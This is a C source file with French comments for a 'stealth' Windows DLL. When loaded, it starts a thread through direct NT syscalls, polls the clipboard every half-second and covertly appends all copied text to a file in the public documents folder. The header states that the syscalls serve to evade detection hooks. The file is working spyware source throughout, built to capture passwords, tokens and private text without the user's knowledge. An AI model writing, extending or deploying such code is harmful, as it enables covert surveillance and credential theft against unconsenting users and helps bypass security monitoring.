/**
 * @file clipboard-logger-stealth.c
 * @brief Version furtive de la DLL de surveillance du presse-papiers.
 * 
 * Cette version utilise des appels système directs pour éviter la détection
 * par les hooks de la libc et ne contient pas d'horodatage dans les logs.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <windows.h>
#include <winternl.h>
#include "direct-syscalls.h"

// Intervalle de scrutation en millisecondes
#define POLLING_INTERVAL 500
// Utilisation d'un chemin NT pour l'écriture via syscalls
#define LOG_FILE_NAME L"\\??\\C:\\Users\\Public\\Documents\\clipboard_log.txt"

// Variables globales
HINSTANCE g_hInstance = NULL;
HANDLE g_hThread = NULL;
BOOL g_bRunning = TRUE;

// Définition de wcslen et strlen pour éviter la dépendance à la libc
size_t wcslen(const wchar_t *s) {
    const wchar_t *p = s;
    while (*p) ++p;
    return p - s;
}

size_t strlen(const char *s) {
    const char *p = s;
    while (*p) ++p;
    return p - s;
}

/**
 * @brief Logue le texte dans le fichier en utilisant des appels système directs.
 */
void LogClipboardText(const char* text) {
    if (!text || text[0] == '\0') return;

    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uniName;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;

    // Initialisation du nom du fichier (format NT)
    uniName.Buffer = (PWSTR)LOG_FILE_NAME;
    uniName.Length = (USHORT)(wcslen(LOG_FILE_NAME) * sizeof(WCHAR));
    uniName.MaximumLength = uniName.Length;

    InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Création ou ouverture du fichier via dCreateFile (NtCreateFile)
    status = dCreateFile(
        &hFile,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (status == 0) { // STATUS_SUCCESS
        SIZE_T len = strlen(text);
        const char* separator = "\r\n-----------------------------------\r\n";
        SIZE_T sepLen = strlen(separator);

        // Écriture du texte via dWriteFile (NtWriteFile)
        dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)text, (ULONG)len, NULL, NULL);
        // Écriture du séparateur
        dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)separator, (ULONG)sepLen, NULL, NULL);

        CloseHandle(hFile);
    }
}

/**
 * @brief Fonction principale du thread de scrutation.
 */
DWORD WINAPI PollingThread(LPVOID lpParam) {
    DWORD dwLastSequence = 0;
    
    dwLastSequence = GetClipboardSequenceNumber();

    while (g_bRunning) {
        DWORD dwCurrentSequence = GetClipboardSequenceNumber();

        if (dwCurrentSequence != dwLastSequence) {
            dwLastSequence = dwCurrentSequence;

            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* pszText = (char*)GlobalLock(hData);
                    if (pszText) {
                        LogClipboardText(pszText);
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
        }
        Sleep(POLLING_INTERVAL);
    }

    return 0;
}

/**
 * @brief Point d'entrée de la DLL.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    g_hInstance = hinstDLL;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            g_bRunning = TRUE;
            
            // Utilisation de dCreateThreadEx (NtCreateThreadEx)
            dCreateThreadEx(
                &g_hThread, 
                THREAD_ALL_ACCESS, 
                NULL,
                GetCurrentProcess(), 
                PollingThread,
                NULL,
                0, 0, 0, 0, 
                NULL
            );
            break;

        case DLL_PROCESS_DETACH:
            g_bRunning = FALSE;
            if (g_hThread) {
                WaitForSingleObject(g_hThread, 1000);
                CloseHandle(g_hThread);
            }
            break;
    }
    return TRUE;
}
